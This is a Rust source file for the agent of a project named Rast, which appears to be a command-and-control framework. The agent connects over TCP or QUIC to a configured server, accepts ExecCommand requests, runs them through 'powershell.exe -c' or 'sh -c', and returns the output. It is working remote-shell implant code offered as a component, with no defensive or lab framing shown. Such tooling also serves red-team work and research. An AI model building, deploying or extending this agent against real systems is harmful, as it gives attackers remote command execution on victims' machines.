//! The agent part of the Rast project.

use std::sync::{Arc, RwLock};

use anyhow::{bail, Result};
use commands::Commands;
use futures_util::{sink::SinkExt, stream::StreamExt};
use rast::{
    encoding::{JsonPackager, Packager},
    messages::c2_agent::{AgentMessage, AgentResponse, C2Request},
    protocols::{quic::QuicFactory, tcp::TcpFactory, Messager, ProtoConnection, ProtoFactory},
    settings::{Connection, Settings},
    RastError,
};
use tokio::{process::Command as SystemCommand, sync::Mutex};
use tracing::{debug, info};

use crate::context::Context;

pub mod commands;
pub mod context;

pub struct RastAgent {
    settings: Settings,
    context: Arc<RwLock<Context>>,
    connection: Arc<Mutex<dyn ProtoConnection>>,
    commands: Commands,
}

impl RastAgent {
    /// Creates new instance using provided [Settings].
    pub async fn with_settings(settings: Settings) -> Result<Self> {
        let connection = RastAgent::get_connection(&settings).await?;

        Ok(RastAgent {
            settings,
            connection,
            commands: Commands::new(),
            context: Arc::new(RwLock::new(Context::new())),
        })
    }

    async fn get_connection(settings: &Settings) -> Result<Arc<Mutex<dyn ProtoConnection>>> {
        for conf in settings.agent.connections.iter() {
            let conn = match conf {
                Connection::Tcp(tcp_conf) => TcpFactory::new_client(tcp_conf).await,
                Connection::Quic(quic_conf) => QuicFactory::new_client(quic_conf).await,
                _ => bail!(RastError::Unknown),
            };

            match conn {
                Ok(conn) => return Ok(conn),
                Err(e) => bail!(e),
            };
        }

        Err(RastError::Unknown.into())
    }

    /// Starts execution.
    pub async fn run(&mut self) -> Result<()> {
        info!("RastAgent running");

        let mut conn = self.connection.lock().await;
        let mut messager = Messager::new(&mut *conn);
        let packager = JsonPackager::default();

        loop {
            if let Some(bytes) = messager.next().await {
                let bytes = match bytes {
                    Ok(bytes) => bytes,
                    Err(e) => {
                        debug!("Failed to parse bytes: {:?}", e);
                        continue;
                    },
                };
                let msg: AgentMessage = match packager.decode(&bytes.into()) {
                    Ok(msg) => {
                        info!("Request {:?}", msg);
                        msg
                    },
                    Err(e) => {
                        debug!("Failed to deserialized to message: {:?}", e);
                        continue;
                    },
                };

                let response = self.handle_message(msg).await;

                let Ok(response) = response else {
                     continue
                };

                let response = match packager.encode(&response) {
                    Ok(serialized) => serialized,
                    Err(e) => {
                        info!(
                            "Failed to serialize response, not sending response: {:?}",
                            e
                        );
                        continue;
                    },
                };

                if let Err(e) = messager.send(response).await {
                    debug!("Failed to send response: {:?}", e);
                };
            }
        }
    }

    async fn handle_message(&self, msg: AgentMessage) -> Result<AgentMessage, RastError> {
        let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {
            debug!("Got unsupported request: {:?}", msg);
            return Err(RastError::Unknown);
        };

        let output = if cfg!(target_os = "windows") {
            SystemCommand::new("powershell.exe")
                .arg("-c")
                .arg(cmd)
                .output()
                .await
        } else {
            SystemCommand::new("sh").arg("-c").arg(cmd).output().await
        };

        info!("Response {:?}", output);
        let response = match output {
            Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
            Err(e) => e.to_string(),
        };

        let response = AgentMessage::AgentResponse(AgentResponse::CommandResponse(response));

        Ok(response)
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);
    }
}
